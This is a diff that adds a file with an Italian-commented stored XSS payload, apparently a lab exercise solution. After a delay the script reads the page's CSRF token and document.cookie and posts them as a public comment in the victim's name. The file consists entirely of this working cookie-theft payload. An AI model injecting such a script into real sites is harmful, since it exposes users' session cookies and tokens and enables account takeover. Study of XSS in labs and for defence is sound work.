@@ -1,0 +1,20 @@
+/* 
+  Recupero dei cookie di sessione della vittima tramite XSS su funzionalità di commento in un post:
+  la vittima che visita la pagina affetta da questo script commenta il post pubblicando i propri dati sensibili
+*/
+
+<script>
+setTimeout(() => {
+  const csrf = document.querySelector('input[name="csrf"]');
+  const form = document.querySelector('form[action="/post/comment"]');
+  
+  if (csrf && form) {
+    form.comment.value = "Il mio CSRF token è: " + csrf.value + " i cookie sono: " + document.cookie;
+    form.name.value = "Victim";
+    form.email.value = "victim@normal-user.net";
+    form.website.value = "https://sito.com";
+    
+    form.submit();  
+  }
+}, 5000);
+</script>
